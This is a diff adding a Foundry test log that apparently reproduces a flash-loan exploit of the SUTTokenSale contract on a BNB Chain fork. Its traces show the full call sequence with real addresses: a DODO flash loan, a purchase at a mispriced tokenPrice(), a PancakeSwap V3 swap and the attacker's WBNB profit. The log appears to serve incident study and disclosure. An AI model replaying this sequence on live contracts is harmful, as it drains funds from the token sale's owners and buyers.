@@ -1,0 +1,141 @@
+No files changed, compilation skipped
+
+Ran 1 test for test/SUT_exp.sol:SUTTest
+[PASS] testExploit() (gas: 290945)
+Logs:
+  Incorrect SUT token price returned from tokenPrice() function: 214224507283633242
+  Buyed number of SUT tokens: 32.663166885742087138
+  Attacker WBNB balance after exploit: 32.992919724107662747
+
+Traces:
+  [20773] SUTTest::setUp()
+    ├─ [0] VM::createSelectFork("bsc", 30165901 [3.016e7])
+    │   └─ ← [Return] 0
+    ├─ [0] VM::label(WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], "WBNB")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(SUT: [0x70E1bc7E53EAa96B74Fad1696C29459829509bE2], "SUT")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(Router: [0x13f4EA83D0bd40E75C8222255bc855a974568Dd4], "Router")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(DPPOracle: [0xFeAFe253802b77456B4627F8c2306a9CeBb5d681], "DPPOracle")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(SUTTokenSale: [0xF075c5C7BA59208c0B9c41afcCd1f60da9EC9c37], "SUTTokenSale")
+    │   └─ ← [Return]
+    └─ ← [Stop]
+
+  [346745] SUTTest::testExploit()
+    ├─ [0] VM::deal(SUTTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
+    │   └─ ← [Return]
+    ├─ [329828] DPPOracle::flashLoan(10000000000000000000 [1e19], 0, SUTTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x00)
+    │   ├─ [29962] WBNB::transfer(SUTTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 10000000000000000000 [1e19])
+    │   │   ├─ emit Transfer(from: DPPOracle: [0xFeAFe253802b77456B4627F8c2306a9CeBb5d681], to: SUTTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 10000000000000000000 [1e19])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x95870720a9b5a6420749f02df2d1248f9e2447dd5ed7a5b82d399a1b406f5197: 0x0000000000000000000000000000000000000000000000b04447eb38ece9a976 → 0x0000000000000000000000000000000000000000000000afb980c8346301a976
+    │   │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 0 → 0x0000000000000000000000000000000000000000000000008ac7230489e80000
+    │   │   └─ ← [Return] true
+    │   ├─ [271023] SUTTest::DPPFlashLoanCall(SUTTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 10000000000000000000 [1e19], 0, 0x00)
+    │   │   ├─ [29423] SUT::approve(Router: [0x13f4EA83D0bd40E75C8222255bc855a974568Dd4], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   ├─ emit Approval(owner: SUTTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: Router: [0x13f4EA83D0bd40E75C8222255bc855a974568Dd4], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x5bdf7cb53d1a063ed4e3801e72a52d5382758fb90255758bc15cd29f1c9e556b: 0 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [9195] WBNB::withdraw(10000000000000000000 [1e19])
+    │   │   │   ├─ [55] SUTTest::receive{value: 10000000000000000000}()
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ emit Withdrawal(src: SUTTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], wad: 10000000000000000000 [1e19])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 0x0000000000000000000000000000000000000000000000008ac7230489e80000 → 0
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [2495] SUTTokenSale::tokenPrice() [staticcall]
+    │   │   │   └─ ← [Return] 214224507283633242 [2.142e17]
+    │   │   ├─ emit log_named_uint(key: "Incorrect SUT token price returned from tokenPrice() function", val: 214224507283633242 [2.142e17])
+    │   │   ├─ [2585] SUT::balanceOf(SUTTokenSale: [0xF075c5C7BA59208c0B9c41afcCd1f60da9EC9c37]) [staticcall]
+    │   │   │   └─ ← [Return] 32663166885742087138 [3.266e19]
+    │   │   ├─ [52485] SUTTokenSale::buyTokens{value: 6855184233076263744}(32663166885742087138 [3.266e19])
+    │   │   │   ├─ [585] SUT::balanceOf(SUTTokenSale: [0xF075c5C7BA59208c0B9c41afcCd1f60da9EC9c37]) [staticcall]
+    │   │   │   │   └─ ← [Return] 32663166885742087138 [3.266e19]
+    │   │   │   ├─ [40357] SUT::transfer(SUTTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 32663166885742087138 [3.266e19])
+    │   │   │   │   ├─  emit topic 0: 0xcc16f5dbb4873280815c1ee09dbd06736cffcc184412cf7a71a0fdb75d397ca5
+    │   │   │   │   │           data: 0x000000000000000000000000f075c5c7ba59208c0b9c41afccd1f60da9ec9c370000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   ├─ emit Transfer(from: SUTTokenSale: [0xF075c5C7BA59208c0B9c41afcCd1f60da9EC9c37], to: SUTTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 32663166885742087138 [3.266e19])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0xb38645331535d8a24250bd866c230d0d85c11b90105fdba49ccc7bb4d9c6bc96: 0 → 0x000000000000000000000000000000000000000000000001c54ae139c7f58be2
+    │   │   │   │   │   @ 0x88fec385a9c492d13500f41c096c3f0a1b2089d2407464c7961523da8666d595: 0x000000000000000000000000000000000000000000000001c54ae139c7f58be2 → 0
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ emit Sell(: SUTTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], : 32663166885742087138 [3.266e19])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 3: 0x000000000000000000000000000000000000000000000000016345785d8a0000 → 0x000000000000000000000000000000000000000000000001c6ae26b2257f8be2
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [585] SUT::balanceOf(SUTTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 32663166885742087138 [3.266e19]
+    │   │   ├─ emit log_named_decimal_uint(key: "Buyed number of SUT tokens", val: 32663166885742087138 [3.266e19], decimals: 18)
+    │   │   ├─ [585] SUT::balanceOf(SUTTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 32663166885742087138 [3.266e19]
+    │   │   ├─ [123757] Router::exactInputSingle(ExactInputSingleParams({ tokenIn: 0x70E1bc7E53EAa96B74Fad1696C29459829509bE2, tokenOut: 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, fee: 2500, recipient: 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496, amountIn: 32663166885742087138 [3.266e19], amountOutMinimum: 0, sqrtPriceLimitX96: 0 }))
+    │   │   │   ├─ [1763] SmartRouterHelper::getPool(0x41ff9AA7e16B8B1a8a8dc4f0eFacd93D02d071c9, SUT: [0x70E1bc7E53EAa96B74Fad1696C29459829509bE2], WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], 2500) [delegatecall]
+    │   │   │   │   └─ ← [Return] 0x000000000000000000000000ebc4b13f574ae8eb68e61b3b21f3457ab2f1f2e4
+    │   │   │   ├─ [106989] 0xEBc4B13F574AE8eb68E61B3B21F3457AB2f1F2e4::swap(SUTTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], true, 32663166885742087138 [3.266e19], 4295128740 [4.295e9], 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000400000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000000000002b70e1bc7e53eaa96b74fad1696c29459829509be20009c4bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c000000000000000000000000000000000000000000)
+    │   │   │   │   ├─ [27962] WBNB::transfer(SUTTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 39848103957183926491 [3.984e19])
+    │   │   │   │   │   ├─ emit Transfer(from: 0xEBc4B13F574AE8eb68E61B3B21F3457AB2f1F2e4, to: SUTTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 39848103957183926491 [3.984e19])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x1f0b23f45ad069167c0fcacb533923e6927159e498757ff48dd8ba7579063b57: 0x0000000000000000000000000000000000000000000000045a35f3451acfd88e → 0x00000000000000000000000000000000000000000000000231350bd85e06c7b3
+    │   │   │   │   │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 0 → 0x0000000000000000000000000000000000000000000000022900e76cbcc910db
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [2585] SUT::balanceOf(0xEBc4B13F574AE8eb68E61B3B21F3457AB2f1F2e4) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 60444921076409531834 [6.044e19]
+    │   │   │   │   ├─ [23437] Router::pancakeV3SwapCallback(32663166885742087138 [3.266e19], -39848103957183926491 [-3.984e19], 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000400000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000000000002b70e1bc7e53eaa96b74fad1696c29459829509be20009c4bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c000000000000000000000000000000000000000000)
+    │   │   │   │   │   ├─ [1983] SmartRouterHelper::verifyCallback(0x41ff9AA7e16B8B1a8a8dc4f0eFacd93D02d071c9, SUT: [0x70E1bc7E53EAa96B74Fad1696C29459829509bE2], WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], 2500) [delegatecall]
+    │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000ebc4b13f574ae8eb68e61b3b21f3457ab2f1f2e4
+    │   │   │   │   │   ├─ [17474] SUT::transferFrom(SUTTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xEBc4B13F574AE8eb68E61B3B21F3457AB2f1F2e4, 32663166885742087138 [3.266e19])
+    │   │   │   │   │   │   ├─  emit topic 0: 0xcc16f5dbb4873280815c1ee09dbd06736cffcc184412cf7a71a0fdb75d397ca5
+    │   │   │   │   │   │   │           data: 0x00000000000000000000000013f4ea83d0bd40e75c8222255bc855a974568dd40000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   ├─ emit Transfer(from: SUTTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xEBc4B13F574AE8eb68E61B3B21F3457AB2f1F2e4, value: 32663166885742087138 [3.266e19])
+    │   │   │   │   │   │   ├─ emit Approval(owner: SUTTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: Router: [0x13f4EA83D0bd40E75C8222255bc855a974568Dd4], value: 115792089237316195423570985008687907853269984665640564039424920841027387552797 [1.157e77])
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 0xb38645331535d8a24250bd866c230d0d85c11b90105fdba49ccc7bb4d9c6bc96: 0x000000000000000000000000000000000000000000000001c54ae139c7f58be2 → 0
+    │   │   │   │   │   │   │   @ 0x35d3d327295f8c7eb08b176bcae0abd4cfb5b8a1dc725f73bbdbe38f7070b862: 0x00000000000000000000000000000000000000000000000346d77f77d3e97dba → 0x0000000000000000000000000000000000000000000000050c2260b19bdf099c
+    │   │   │   │   │   │   │   @ 0x5bdf7cb53d1a063ed4e3801e72a52d5382758fb90255758bc15cd29f1c9e556b: 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff → 0xfffffffffffffffffffffffffffffffffffffffffffffffe3ab51ec6380a741d
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   ├─ [585] SUT::balanceOf(0xEBc4B13F574AE8eb68E61B3B21F3457AB2f1F2e4) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 93108087962151618972 [9.31e19]
+    │   │   │   │   ├─ emit Swap(sender: Router: [0x13f4EA83D0bd40E75C8222255bc855a974568Dd4], recipient: SUTTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount0: 32663166885742087138 [3.266e19], amount1: -39848103957183926491 [-3.984e19], sqrtPriceX96: 82151339826559879215498212162 [8.215e28], liquidity: 279412876722495288565 [2.794e20], tick: 724, protocolFeesToken0: 26130533508593669 [2.613e16], protocolFeesToken1: 0)
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 9: 0x010000000000000000001f68fad4685b0871c441fefffff4a11b511764bac5e8 → 0x010000000000000000001f6b2bcc7dfb7668b7473bfffff4a2c76f1d64bae719
+    │   │   │   │   │   @ 4: 0x0000000000000000002b6cb59955f612000000000000000000193906597facfa → 0x0000000000000000002b6cb59955f612000000000000000000760e9b4911e4ff
+    │   │   │   │   │   @ 0: 0x000000000100010000000ce600000000000000012df453b5b5aa9492da4445b8 → 0x0000000001000100000002d400000000000000010971fedfa0a7a78a4a6d3342
+    │   │   │   │   │   @ 2: 0x000000000000000000000000000000000051603474c1b51724b48edde76d8dea → 0x00000000000000000000000000000000005e66521f4ce92b175652cad0ee3e2d
+    │   │   │   │   └─ ← [Return] 32663166885742087138 [3.266e19], -39848103957183926491 [-3.984e19]
+    │   │   │   └─ ← [Return] 39848103957183926491 [3.984e19]
+    │   │   ├─ [2074] WBNB::deposit{value: 3144815766923736256}()
+    │   │   │   ├─ emit Deposit(dst: SUTTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], wad: 3144815766923736256 [3.144e18])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 0x0000000000000000000000000000000000000000000000022900e76cbcc910db → 0x00000000000000000000000000000000000000000000000254a588b3ec52859b
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [3262] WBNB::transfer(DPPOracle: [0xFeAFe253802b77456B4627F8c2306a9CeBb5d681], 10000000000000000000 [1e19])
+    │   │   │   ├─ emit Transfer(from: SUTTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: DPPOracle: [0xFeAFe253802b77456B4627F8c2306a9CeBb5d681], value: 10000000000000000000 [1e19])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x95870720a9b5a6420749f02df2d1248f9e2447dd5ed7a5b82d399a1b406f5197: 0x0000000000000000000000000000000000000000000000afb980c8346301a976 → 0x0000000000000000000000000000000000000000000000b04447eb38ece9a976
+    │   │   │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 0x00000000000000000000000000000000000000000000000254a588b3ec52859b → 0x000000000000000000000000000000000000000000000001c9de65af626a859b
+    │   │   │   └─ ← [Return] true
+    │   │   └─ ← [Stop]
+    │   ├─ [534] WBNB::balanceOf(DPPOracle: [0xFeAFe253802b77456B4627F8c2306a9CeBb5d681]) [staticcall]
+    │   │   └─ ← [Return] 3251547116720532072822 [3.251e21]
+    │   ├─ [2531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(DPPOracle: [0xFeAFe253802b77456B4627F8c2306a9CeBb5d681]) [staticcall]
+    │   │   └─ ← [Return] 181175961505897923421151 [1.811e23]
+    │   ├─ [534] WBNB::balanceOf(DPPOracle: [0xFeAFe253802b77456B4627F8c2306a9CeBb5d681]) [staticcall]
+    │   │   └─ ← [Return] 3251547116720532072822 [3.251e21]
+    │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(DPPOracle: [0xFeAFe253802b77456B4627F8c2306a9CeBb5d681]) [staticcall]
+    │   │   └─ ← [Return] 181175961505897923421151 [1.811e23]
+    │   ├─ emit DODOFlashLoan(: SUTTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], : SUTTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], : 10000000000000000000 [1e19], : 0)
+    │   └─ ← [Stop]
+    ├─ [534] WBNB::balanceOf(SUTTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 32992919724107662747 [3.299e19]
+    ├─ [2444] WBNB::decimals() [staticcall]
+    │   └─ ← [Return] 18
+    ├─ emit log_named_decimal_uint(key: "Attacker WBNB balance after exploit", val: 32992919724107662747 [3.299e19], decimals: 18)
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 10.65s (9.51s CPU time)
+
+Ran 1 test suite in 12.93s (10.65s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
